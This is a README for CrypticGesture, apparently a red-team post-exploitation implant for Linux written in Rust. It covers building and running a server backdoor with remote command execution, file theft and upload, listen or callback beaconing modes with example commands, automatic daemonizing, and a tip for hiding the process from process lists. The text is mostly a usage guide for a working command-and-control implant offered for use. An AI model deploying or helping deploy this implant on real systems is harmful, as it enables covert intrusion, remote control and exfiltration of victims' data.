# CrypticGesture
CrypticGesture is a post-exploitation Linux implant written in [Rust](https://www.rust-lang.org).  It consists of two executables, a server to leave on a remote host, and a client to interact with the remote server executable.

NOTE: The team using this tool is relatively small, so it's mainly been built to suit our needs.  If you notice any bugs or have feature requests, let us know :)

# Features
- Command execution.
- File Upload.
- File Download.
- Symmetric encryption using the Diffie-Hellman key excange method.
- Listening on arbitrary ports for incoming connections from the client.
- Beaconing at regular intervals to a configurable IP address.

# Build Instructions
NOTE: Requires Rust >= 1.6 [Downloads](https://www.rust-lang.org/downloads.html)
```
git clone https://github.com/defpoint/CrypticGesture
cd CrypticGesture/server
cargo build --release
cd ../client
cargo build --release
```
The client and server binaries should now be built.  They will be located at 
```
CrypticGesture/[client|server]/target/release/[crypticclient|crypticserver]
```
TIP: Rust will automatically download and compile external libraries, or [crates](http://doc.crates.io/guide.html), during compilation.

# Server Usage
The server reads its environment variables to know which port, IPv4 Address, and connection mode it will be using.  The following variables may be set:
- L - Instructs the server to listen on the interface associated with this IPv4 addressfor incoming connections from a client.
- C - Instructs the server to beacon back to this IPv4 address on regular configurable intervals.
- P - If the server is set to listen, it will bind to this port.  If the server is set to beacon out, this is the port it will attempt to connect to.
- B - If the server is set to listen, this is the number of seconds the implant will wait between each beacon.  Defaults to 15 minutes.

It is also advisable to set PATH=. when you start the server to avoid having ./server in your process list.  The server will re-set it's PATH variable once it is running.
Examples:

Listen for incoming connections on all interfaces on port 5555.
```
PATH=. L=0.0.0.0 P=5555 server
```

Beacon out to 192.168.2.1 every 30 minutes.
```
PATH=. B=1800 C=192.168.2.1 server
```

When executed, the server will automatically daemonize.

# Client Usage
The client is configurable with the following command line options:
- -h - Prints the available command line parameters and exits.
- -c - Attempts to connect to this IPv4 address.
- -l - Listens locally on this IPv4 address for incoming server beacons.
- -p - Port used for connecting to a remote server, or listening locally for incoming server connections.

NOTE: In order to retrieve files, the client expects there to be a local /storage directory that it can read and write to.

Once the client is connected, you will be at the following prompt:
```
Enter Command:
```

Note that this doesn't start a shell.  That means, no arrow keys, tab completion, pipe redirection, etc.  It's on the roadmap, but not finished for this initial release.  Commands can be executed as normal from this prompt, and their output will be printed to the screen.

CrypticGesture has three special commands:
- !get - Retrieve files from the remote host and store them in /storage.
```
!get /full/path/to/remote/file
```
- !put - Upload a local file to the remote host.
```
!put /full/path/to/local/file /full/path/to/remote/file
```
- !quit - Inform the server that you are ending the current session
```
!quit
```

#Road Map
- TCP tunneling.
- A more friendly command line experience without having to spawn a full shell.
- Ability to configure beacon intervals and callback addresses of a running server.
- Add configurable variations to the beacon interval.
- More communication methods (UDP, HTTP, etc.)

# Summary

CrypticGesture was deliberately created with minimal functionality to reduce filesize, code complexity, and to make it easier to integrate with other frameworks.

With some minor changes, CrypticGesture can be used on Windows, but the user experience is less than ideal, so it's not recommended at this time.

Finally, this is the first release of this tool, so if there are any bugs, let us know!
